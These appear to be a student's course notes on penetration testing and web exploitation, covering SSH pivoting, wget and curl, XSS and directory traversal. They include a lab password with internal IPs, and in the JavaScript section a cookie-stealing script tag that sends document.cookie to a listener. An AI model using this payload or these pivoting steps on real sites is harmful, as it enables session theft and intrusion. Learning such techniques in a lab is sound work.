# Security
```
HOUT-005-M 
STACK # 19 
PASS: NGhXitkmKFkviR3
IP: 10.50.37.133
Linux op stations: 192.168.65.20, 10.50.37.248
Windws OP: 192.168.65.10, 10.50.38.70

```
# Control Socket
```
## Set up control Socket 
ssh -MS /tmp/jump student@10.50.37.133

## Ping sweep from jump box 
for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done

## Dynamic port forward
ssh -S /tmp/jump -O forward -D9050

## Nmap found IP's 
proxychaains nmap x.x.x.x

## Interogate found ports 
proxychains nc x.x.x.x ##

## Port forward 
ssh -S /tmp/jump jump -O forward -L1111:192.168.28.100:80 -L3333:192.168.28.100:2222
  - Can contain multiple jumps within socket file 

## Set up next hop 
 ssh -MS /tmp/t1 credentials@127.0.0.1 -p 3333

## Cancel Port Forward 
ssh -S /t,mp/jump jump -O cancel -L1111:192.168.1.100:80
ssh -S /tmo/jump jump -O cancel -D9050

```

# Penetration Testing 


## 6 Phases
```
* Mission definition 
* Recon 
* Footprinting 
* Explotation & Initial Access
* Post-Explotation 
* Document Mission

### Phase 1 Mission definition 
* Define Goals, scope and RoE

### Phase 2 Recon 

### Phase 3 Footprinting 

### Phase 4 Exploitation & Initial Access 

### Phase 5 Post-Exploitation 

### Phase 6 Document Mission 

```

# nmap Scripts

```
/usr/share/nmap/scripts -> Locationof nmap scripts
```
# Web Exploitation 
## Day #1 

```
* Http tools
- tcpdump 
- wireshark 

* Http Methods 
- Get 
- Post 
- Head 
- Put

* Http Response Codes 
- 10X -> Information al 
- 2XX -> Success
- 30X -> Redirection 
- 4XX -> Client Error 
- 5XX -> Server Error 

* Http Fields 
- User-Agent 
- Referer 
- Cookie 
- Date 
- Server
- Set-Cookie 

* ?var=hi -> Sends a GET request for specified variable to web server 
```

# Wget 

```
* Recursively download
* Recover from Broken Transfers 
* SSL/TLS support

Examples: 
wget -r -l2 -P /tmp ftp://ftpserver/
wget --save-cookies cookies.txt --keep-session-cookies --post-data 'user=1&password=2' https://website
wget --load-cookies cookies.txt -p https://website/interesting/article.php

```

# cURL 

``` 
* Not Recursive 
* Can use pipes 
* Upload abilty 
* Supports more protocols vs Wget like SCP & POP3

Examples: 
curl -o stuff.html https://web.site/stuff.html
curl 'https://web.site/submit.php' -H 'Cookie: name=123; settings=1,2,3,4,5,6,7' --data 'name=Stan' | base64 -d > item.png

``` 

# JavaScript(JS)
```
* Allows websites to interact with the client

* JavaScript runs on the client’s machine

* Coded as .js files, or in-line of HTML

* changeText()

* <script>document.location="http://10.50.X.X:8000/"+document.cookie;</script>


```
# Enumeration 
```
* ROBOTS.TXT -> 
* Legitimate Surfing 
* Tools 
- NSE scripts 
- Nikto 
Burp suite (outside class)

```
# Cross-Site Scipting (XSS) Overview 

```
* Insertion o farbitary code into a webpage, that excutes in browser of visitors 
* Unsanitized GET,POST, and PUT methods allow JS to be placed on websites 
* Often found in forums that allow HTML

```

# Reflected XSS 

```
* Most common form of XSS 
* transient, occurs in erro rmessages or serach results 
* Delivered through intermediate media, such as a link in an email 
* Characters that are normally illegal in URLs can be Base64 encded 

```

# Sever-Side injection 

```
Directory Traversal/Path Traversal


Ability to read/execute outside web server’s directory

Uses ../../ (relative paths) in manipulating a server-side file path


```

# Malicious 
ile upload 


# Command Injection 

```

```
























